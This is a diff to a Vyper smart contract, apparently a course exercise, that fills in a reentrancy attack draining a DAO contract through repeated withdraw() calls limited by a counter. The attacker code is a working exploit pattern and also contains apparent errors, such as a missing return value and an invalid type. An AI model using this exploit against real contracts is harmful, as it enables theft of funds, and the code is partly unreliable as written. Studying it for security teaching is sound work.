@@ -6,11 +6,13 @@ interface DAO:
 dao_address: public(address)
 owner_address: public(address)
 is_attack: public(bool)
+counter: public(int)
 
 @external
 def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
+    self.counter = 10
 
 @internal
 def _attack() -> bool:
@@ -18,13 +20,9 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    if(self.dao_address.balance < 0):
-        self.is_attack = False
-        return False
-    #amountToWithdraw: uint256 = DAO(dao_address).userBalances[self.dao_address]
-    DAO(self.dao_address).withdraw()
-
-    return True
+    if(self.counter > 0):
+        DAO(self.dao_address).withdraw()
+        self.counter -= 1
 
 @external
 @payable
@@ -39,9 +37,9 @@ def attack(dao_address:address):
     # TODO: make the deposit into the DAO
     DAO(dao_address).deposit(value=deposit_amount)
     
-    self.is_attack = True
+    #self.is_attack = True
     # TODO: Start the reentrance attack
-    if(self.is_attack == True):
+    if(self.counter > 0):
         #_attack = false
         DAO(dao_address).withdraw()
 
